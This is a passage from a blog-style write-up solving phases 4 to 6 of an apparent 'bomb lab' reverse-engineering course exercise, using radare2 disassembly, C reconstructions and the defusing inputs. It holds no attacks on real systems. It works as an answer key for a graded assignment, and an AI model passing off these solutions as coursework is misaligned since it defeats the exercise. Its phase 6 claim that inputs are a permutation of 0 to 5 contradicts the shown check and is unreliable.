+            ; CALL XREF from dbg.main @ 0x400e8e(x)
+┌ 86: sym.phase_4 (const char *s);
+│           ; arg const char *s @ rdi
+│           ; var uint32_t var_8h @ rsp+0x8
+│           ; var uint32_t var_ch @ rsp+0xc
+│           0x0040100c      4883ec18       sub rsp, 0x18
+│           0x00401010      488d4c240c     lea rcx, [var_ch]
+│           0x00401015      488d542408     lea rdx, [var_8h]           ;   ...
+│           0x0040101a      becf254000     mov esi, 0x4025cf           ; &amp;quot;%d %d&amp;quot; ; const char *format
+│           0x0040101f      b800000000     mov eax, 0
+│           0x00401024      e8c7fbffff     call sym.imp.__isoc99_sscanf ; int sscanf(const char *s, const char *format,   ...)
+│           0x00401029      83f802         cmp eax, 2                  ; 2
+│       ┌─&amp;lt; 0x0040102c      7507           jne 0x401035
+│       │   0x0040102e      837c24080e     cmp dword [var_8h], 0xe
+│      ┌──&amp;lt; 0x00401033      7605           jbe 0x40103a
+│      ││   ; CODE XREF from sym.phase_4 @ 0x40102c(x)
+│      │└─&amp;gt; 0x00401035      e800040000     call sym.explode_bomb
+│      │    ; CODE XREF from sym.phase_4 @ 0x401033(x)
+│      └──&amp;gt; 0x0040103a      ba0e000000     mov edx, 0xe                ; 14 ; int64_t arg3
+│           0x0040103f      be00000000     mov esi, 0                  ; int64_t arg2
+│           0x00401044      8b7c2408       mov edi, dword [var_8h]     ; int64_t arg1
+│           0x00401048      e881ffffff     call sym.func4
+│           0x0040104d      85c0           test eax, eax
+│       ┌─&amp;lt; 0x0040104f      7507           jne 0x401058
+│       │   0x00401051      837c240c00     cmp dword [var_ch], 0
+│      ┌──&amp;lt; 0x00401056      7405           je 0x40105d
+│      ││   ; CODE XREF from sym.phase_4 @ 0x40104f(x)
+│      │└─&amp;gt; 0x00401058      e8dd030000     call sym.explode_bomb
+│      │    ; CODE XREF from sym.phase_4 @ 0x401056(x)
+│      └──&amp;gt; 0x0040105d      4883c418       add rsp, 0x18
+└           0x00401061      c3             ret
+
+
+[0x0040100c]&amp;gt; s sym.func4
+[0x00400fce]&amp;gt; pdf
+            ; CALL XREFS from sym.func4 @ 0x400fe9(x), 0x400ffe(x)
+            ; CALL XREF from sym.phase_4 @ 0x401048(x)
+┌ 62: sym.func4 (signed int arg1, int64_t arg2, int64_t arg3);
+│           ; arg signed int arg1 @ rdi
+│           ; arg int64_t arg2 @ rsi
+│           ; arg int64_t arg3 @ rdx
+│           0x00400fce      4883ec08       sub rsp, 8
+│           0x00400fd2      89d0           mov eax, edx                ; arg3
+│           0x00400fd4      29f0           sub eax, esi                ; arg2
+│           0x00400fd6      89c1           mov ecx, eax
+│           0x00400fd8      c1e91f         shr ecx, 0x1f
+│           0x00400fdb      01c8           add eax, ecx
+│           0x00400fdd      d1f8           sar eax, 1
+│           0x00400fdf      8d0c30         lea ecx, [rax + rsi]
+│           0x00400fe2      39f9           cmp ecx, edi                ; arg1
+│       ┌─&amp;lt; 0x00400fe4      7e0c           jle 0x400ff2
+│       │   0x00400fe6      8d51ff         lea edx, [rcx - 1]
+│       │   0x00400fe9      e8e0ffffff     call sym.func4
+│       │   0x00400fee      01c0           add eax, eax
+│      ┌──&amp;lt; 0x00400ff0      eb15           jmp 0x401007
+│      ││   ; CODE XREF from sym.func4 @ 0x400fe4(x)
+│      │└─&amp;gt; 0x00400ff2      b800000000     mov eax, 0
+│      │    0x00400ff7      39f9           cmp ecx, edi                ; arg1
+│      │┌─&amp;lt; 0x00400ff9      7d0c           jge 0x401007
+│      ││   0x00400ffb      8d7101         lea esi, [rcx + 1]
+│      ││   0x00400ffe      e8cbffffff     call sym.func4
+│      ││   0x00401003      8d440001       lea eax, [rax + rax + 1]
+│      ││   ; CODE XREFS from sym.func4 @ 0x400ff0(x), 0x400ff9(x)
+│      └└─&amp;gt; 0x00401007      4883c408       add rsp, 8
+└           0x0040100b      c3             ret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Still, read 2 numbers from input by &lt;code&gt;sscanf()&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;func4()&lt;/code&gt; should be:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;func4&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; a2, &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; a3){
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; ecx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a3 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; a2;
+    ecx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; ecx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1f&lt;/span&gt;;
+    ecx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (ecx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a2;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (ecx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; a1) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; func4(a1, a2, a3 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (ecx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; a1) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; func4(a1, a2, a3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Our target is &lt;code&gt;func(input[0], 0, 14) == 0&lt;/code&gt;, therefore &lt;code&gt;input[0]&lt;/code&gt; should be &lt;code&gt;0&lt;/code&gt; or &lt;code&gt;1&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Since &lt;code&gt;cmp dword [var_ch], 0&lt;/code&gt;, &lt;code&gt;input[1]&lt;/code&gt; should be &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Halfway there!
+1 0
+So you got that one.  Try this one.
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-5&#34;&gt;Phase 5&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x00400da0]&amp;gt; s sym.phase_5
+[0x00401062]&amp;gt; pdf
+            ; CALL XREF from dbg.main @ 0x400eaa(x)
+┌ 137: sym.phase_5 (int64_t arg1);
+│           ; arg int64_t arg1 @ rdi
+│           ; var int64_t var_10h @ rsp+0x10
+│           ; var int64_t var_16h @ rsp+0x16
+│           ; var int64_t canary @ rsp+0x18
+│           0x00401062      53             push rbx
+│           0x00401063      4883ec20       sub rsp, 0x20
+│           0x00401067      4889fb         mov rbx, rdi                ; arg1
+│           0x0040106a      64488b042528.  mov rax, qword fs:[0x28]
+│           0x00401073      4889442418     mov qword [canary], rax
+│           0x00401078      31c0           xor eax, eax
+│           0x0040107a      e89c020000     call sym.string_length
+│           0x0040107f      83f806         cmp eax, 6                  ; 6
+│       ┌─&amp;lt; 0x00401082      744e           je 0x4010d2
+│       │   0x00401084      e8b1030000     call sym.explode_bomb
+..
+│      ││   ; CODE XREFS from sym.phase_5 @ 0x4010ac(x), 0x4010d7(x)
+│    ┌┌───&amp;gt; 0x0040108b      0fb60c03       movzx ecx, byte [rbx + rax]
+│    ╎╎││   0x0040108f      880c24         mov byte [rsp], cl
+│    ╎╎││   0x00401092      488b1424       mov rdx, qword [rsp]
+│    ╎╎││   0x00401096      83e20f         and edx, 0xf                ; 15
+│    ╎╎││   0x00401099      0fb692b02440.  movzx edx, byte [rdx + obj.array.3449] ; [0x4024b0:1]=109 ; &amp;quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&amp;quot;
+│    ╎╎││   0x004010a0      88540410       mov byte [rsp + rax + 0x10], dl
+│    ╎╎││   0x004010a4      4883c001       add rax, 1
+│    ╎╎││   0x004010a8      4883f806       cmp rax, 6                  ; 6
+│    └────&amp;lt; 0x004010ac      75dd           jne 0x40108b
+│     ╎││   0x004010ae      c644241600     mov byte [var_16h], 0
+│     ╎││   0x004010b3      be5e244000     mov esi, str.flyers         ; 0x40245e ; &amp;quot;flyers&amp;quot; ; int64_t arg2
+│     ╎││   0x004010b8      488d7c2410     lea rdi, [var_10h]          ; int64_t arg1
+│     ╎││   0x004010bd      e876020000     call sym.strings_not_equal
+│     ╎││   0x004010c2      85c0           test eax, eax
+│    ┌────&amp;lt; 0x004010c4      7413           je 0x4010d9
+│    │╎││   0x004010c6      e86f030000     call sym.explode_bomb
+..
+│   ││╎││   ; CODE XREF from sym.phase_5 @ 0x401082(x)
+│   ││╎││   ; CODE XREF from sym.phase_5 @ +0x27(x)
+│   ││╎└└─&amp;gt; 0x004010d2      b800000000     mov eax, 0
+│   ││└───&amp;lt; 0x004010d7      ebb2           jmp 0x40108b
+│   ││      ; CODE XREF from sym.phase_5 @ 0x4010c4(x)
+│   ││      ; CODE XREF from sym.phase_5 @ +0x6e(x)
+│   └└────&amp;gt; 0x004010d9      488b442418     mov rax, qword [canary]
+│           0x004010de      644833042528.  xor rax, qword fs:[0x28]
+│       ┌─&amp;lt; 0x004010e7      7405           je 0x4010ee
+│       │   0x004010e9      e842faffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
+│       │   ; CODE XREF from sym.phase_5 @ 0x4010e7(x)
+│       └─&amp;gt; 0x004010ee      4883c420       add rsp, 0x20
+│           0x004010f2      5b             pop rbx
+└           0x004010f3      c3             ret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;First, &lt;code&gt;string_length(input) == 6&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Fall into a loop:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
+    ecx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input[i];
+    edx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ecx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf&lt;/span&gt;;
+    edx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; maduiersnfotvbyl[edx];
+    var_10h[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; edx;
+}
+strings_not_equal(var_10h[i], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flyers&amp;#34;&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So our input should be:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0x?9 0x?f 0x?e 0x?5 0x?6 0x?7
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For easy to input, we can simply set &lt;code&gt;?&lt;/code&gt; as &lt;code&gt;6&lt;/code&gt;.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;So you got that one.  Try this one.
+ionefg
+Good work!  On to the next...
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-6&#34;&gt;Phase 6&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x00400da0]&amp;gt; s sym.phase_6
+[0x004010f4]&amp;gt; pdf
+            ; CALL XREF from dbg.main @ 0x400ec6(x)
+┌ 272: sym.phase_6 (const char *s);
+│           ; arg const char *s @ rdi
+│           ; var int64_t var_18h @ rsp+0x18
+│           ; var int64_t var_20h @ rsp+0x20
+│           ; var int64_t var_28h @ rsp+0x28
+│           ; var int64_t var_50h @ rsp+0x50
+│           0x004010f4      4156           push r14
+│           0x004010f6      4155           push r13
+│           0x004010f8      4154           push r12
+│           0x004010fa      55             push rbp
+│           0x004010fb      53             push rbx
+│           0x004010fc      4883ec50       sub rsp, 0x50
+│           0x00401100      4989e5         mov r13, rsp
+│           0x00401103      4889e6         mov rsi, rsp                ; int64_t arg2
+│           0x00401106      e851030000     call sym.read_six_numbers
+│           0x0040110b      4989e6         mov r14, rsp
+│           0x0040110e      41bc00000000   mov r12d, 0
+│           ; CODE XREF from sym.phase_6 @ 0x401151(x)
+│       ┌─&amp;gt; 0x00401114      4c89ed         mov rbp, r13
+│       ╎   0x00401117      418b4500       mov eax, dword [r13]
+│       ╎   0x0040111b      83e801         sub eax, 1
+│       ╎   0x0040111e      83f805         cmp eax, 5                  ; 5
+│      ┌──&amp;lt; 0x00401121      7605           jbe 0x401128
+│      │╎   0x00401123      e812030000     call sym.explode_bomb
+│      │╎   ; CODE XREF from sym.phase_6 @ 0x401121(x)
+│      └──&amp;gt; 0x00401128      4183c401       add r12d, 1
+│       ╎   0x0040112c      4183fc06       cmp r12d, 6                 ; 6
+│      ┌──&amp;lt; 0x00401130      7421           je 0x401153
+│      │╎   0x00401132      4489e3         mov ebx, r12d
+│      │╎   ; CODE XREF from sym.phase_6 @ 0x40114b(x)
+│     ┌───&amp;gt; 0x00401135      4863c3         movsxd rax, ebx
+│     ╎│╎   0x00401138      8b0484         mov eax, dword [rsp + rax*4]
+│     ╎│╎   0x0040113b      394500         cmp dword [rbp], eax
+│    ┌────&amp;lt; 0x0040113e      7505           jne 0x401145
+│    │╎│╎   0x00401140      e8f5020000     call sym.explode_bomb
+│    │╎│╎   ; CODE XREF from sym.phase_6 @ 0x40113e(x)
+│    └────&amp;gt; 0x00401145      83c301         add ebx, 1
+│     ╎│╎   0x00401148      83fb05         cmp ebx, 5                  ; 5
+│     └───&amp;lt; 0x0040114b      7ee8           jle 0x401135
+│      │╎   0x0040114d      4983c504       add r13, 4
+│      │└─&amp;lt; 0x00401151      ebc1           jmp 0x401114
+│      │    ; CODE XREF from sym.phase_6 @ 0x401130(x)
+│      └──&amp;gt; 0x00401153      488d742418     lea rsi, [var_18h]
+│           0x00401158      4c89f0         mov rax, r14
+│           0x0040115b      b907000000     mov ecx, 7
+│           ; CODE XREF from sym.phase_6 @ 0x40116d(x)
+│       ┌─&amp;gt; 0x00401160      89ca           mov edx, ecx
+│       ╎   0x00401162      2b10           sub edx, dword [rax]
+│       ╎   0x00401164      8910           mov dword [rax], edx
+│       ╎   0x00401166      4883c004       add rax, 4
+│       ╎   0x0040116a      4839f0         cmp rax, rsi
+│       └─&amp;lt; 0x0040116d      75f1           jne 0x401160
+│           0x0040116f      be00000000     mov esi, 0
+│       ┌─&amp;lt; 0x00401174      eb21           jmp 0x401197
+│       │   ; CODE XREFS from sym.phase_6 @ 0x40117f(x), 0x4011a9(x)
+│     ┌┌──&amp;gt; 0x00401176      488b5208       mov rdx, qword [rdx + 8]
+│     ╎╎│   0x0040117a      83c001         add eax, 1
+│     ╎╎│   0x0040117d      39c8           cmp eax, ecx
+│     └───&amp;lt; 0x0040117f      75f5           jne 0x401176
+│     ┌───&amp;lt; 0x00401181      eb05           jmp 0x401188
+│     │╎│   ; CODE XREF from sym.phase_6 @ 0x40119d(x)
+│    ┌────&amp;gt; 0x00401183      bad0326000     mov edx, obj.node1          ; 0x6032d0 ; &amp;quot;L\x01&amp;quot;
+│    ╎│╎│   ; CODE XREF from sym.phase_6 @ 0x401181(x)
+│    ╎└───&amp;gt; 0x00401188      4889547420     mov qword [rsp + rsi*2 + 0x20], rdx
+│    ╎ ╎│   0x0040118d      4883c604       add rsi, 4
+│    ╎ ╎│   0x00401191      4883fe18       cmp rsi, 0x18               ; 24
+│    ╎┌───&amp;lt; 0x00401195      7414           je 0x4011ab
+│    ╎│╎│   ; CODE XREF from sym.phase_6 @ 0x401174(x)
+│    ╎│╎└─&amp;gt; 0x00401197      8b0c34         mov ecx, dword [rsp + rsi]
+│    ╎│╎    0x0040119a      83f901         cmp ecx, 1                  ; 1
+│    └────&amp;lt; 0x0040119d      7ee4           jle 0x401183
+│     │╎    0x0040119f      b801000000     mov eax, 1
+│     │╎    0x004011a4      bad0326000     mov edx, obj.node1          ; 0x6032d0 ; &amp;quot;L\x01&amp;quot;
+│     │└──&amp;lt; 0x004011a9      ebcb           jmp 0x401176
+│     │     ; CODE XREF from sym.phase_6 @ 0x401195(x)
+│     └───&amp;gt; 0x004011ab      488b5c2420     mov rbx, qword [var_20h]
+│           0x004011b0      488d442428     lea rax, [var_28h]
+│           0x004011b5      488d742450     lea rsi, [var_50h]
+│           0x004011ba      4889d9         mov rcx, rbx
+│           ; CODE XREF from sym.phase_6 @ 0x4011d0(x)
+│       ┌─&amp;gt; 0x004011bd      488b10         mov rdx, qword [rax]
+│       ╎   0x004011c0      48895108       mov qword [rcx + 8], rdx
+│       ╎   0x004011c4      4883c008       add rax, 8
+│       ╎   0x004011c8      4839f0         cmp rax, rsi
+│      ┌──&amp;lt; 0x004011cb      7405           je 0x4011d2
+│      │╎   0x004011cd      4889d1         mov rcx, rdx
+│      │└─&amp;lt; 0x004011d0      ebeb           jmp 0x4011bd
+│      │    ; CODE XREF from sym.phase_6 @ 0x4011cb(x)
+│      └──&amp;gt; 0x004011d2      48c742080000.  mov qword [rdx + 8], 0
+│           0x004011da      bd05000000     mov ebp, 5
+│           ; CODE XREF from sym.phase_6 @ 0x4011f5(x)
+│       ┌─&amp;gt; 0x004011df      488b4308       mov rax, qword [rbx + 8]
+│       ╎   0x004011e3      8b00           mov eax, dword [rax]
+│       ╎   0x004011e5      3903           cmp dword [rbx], eax
+│      ┌──&amp;lt; 0x004011e7      7d05           jge 0x4011ee
+│      │╎   0x004011e9      e84c020000     call sym.explode_bomb
+│      │╎   ; CODE XREF from sym.phase_6 @ 0x4011e7(x)
+│      └──&amp;gt; 0x004011ee      488b5b08       mov rbx, qword [rbx + 8]
+│       ╎   0x004011f2      83ed01         sub ebp, 1
+│       └─&amp;lt; 0x004011f5      75e8           jne 0x4011df
+│           0x004011f7      4883c450       add rsp, 0x50
+│           0x004011fb      5b             pop rbx
+│           0x004011fc      5d             pop rbp
+│           0x004011fd      415c           pop r12
+│           0x004011ff      415d           pop r13
+│           0x00401201      415e           pop r14
+└           0x00401203      c3             ret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;read_six_numbers()&lt;/code&gt; from input string.&lt;/p&gt;
+&lt;p&gt;A loop:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; r12d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; r12d &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;; r12d&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;r13 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) explode_bomb();
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; ebx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r12d; ebx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; ebx&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;r13 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; rsp[ebx]) explode_bomb();
+    }
+    r13 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Therefore, 6 numbers must be a permutation of [0, 1, 2, 3, 4, 5].&lt;/p&gt;
+&lt;p&gt;Calculations before check.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;num[i] = 7 - num[i]&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rsp;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;rax;
+    rax &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
+} &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(rax &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Re-sort the Nodes.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; esi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; esi &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;; esi &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) {
+    ecx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rsp[esi];
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (ecx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
+        edx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; node1;
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+        eax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+        edx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; node1;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
+            rdx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdx.next;
+            eax &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+        } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (eax &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; ecx);
+    }
+    var_20h[rsi &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdx;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Node is a One-way LinkedList&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;node1
+    dd 14Ch 
+    dd 1
+    dq offset node2
+
+node2
+    dd 0A8h
+    dd 2
+    dq offset node3
+
+node3
+    dd 39Ch
+    dd 3
+    dq offset node4
+
+node4
+    dd 2B3h
+    dd 4
+    dq offset node5
+
+node5
+    dd 1DDh
+    dd 5
+    dq offset node6
+
+node6
+    dd 1BBh
+    dd 6
+    dq offset 0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Re-linked.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;rcx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;var_20h;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+    rdx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var_20h[i];
+    rcx.next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdx;
+    rcx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdx;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Final check: nodes should be sorted by value.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;rbx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;var_20h;
